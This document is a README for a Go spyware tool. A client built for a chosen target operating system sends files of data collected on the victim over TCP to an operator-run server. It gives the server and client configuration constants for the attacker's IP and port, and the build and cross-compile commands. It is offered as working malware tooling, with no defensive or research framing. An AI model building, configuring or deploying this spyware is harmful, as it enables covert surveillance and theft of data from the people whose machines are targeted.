# TCP-SPYWARE-GOLANG
Server will be running while clients connect and send files full of data collected on target to server.

### Starting the server
Change to HOST and PORT constants in the server.go file to your IP and the port you want to listen on respectively.
```go
const (
	HOST       = "YOUR IP"
	PORT       = "8080"
	TYPE       = "tcp"
	BUFFERSIZE = 1024
	OUTPUTPATH = "RecievedData/"
)
```
#### Building the server
``` bash
$ cd server
$ go build .
$ ./server
```

### Configuring the client
Configure the constants to your needs
``` go
const (
	HOST       = "YOUR IP"
	PORT       = "8080"
	TYPE       = "tcp"
    BUFFERSIZE = 1024
	PATH       = "dummyfile.txt"
)
```
The HOST, PORT and BUFFERSIZE constants need to match those in your server.go file.
If you change any buffer sizes you need to change them in both files or else things will start to break.
#### Building the client
```bash
$ cd client
$ GOOS=OPERATING_SYSTEM_NAME GOARCH=amd64 go build -o OUTPUT_FILENAME main.go
```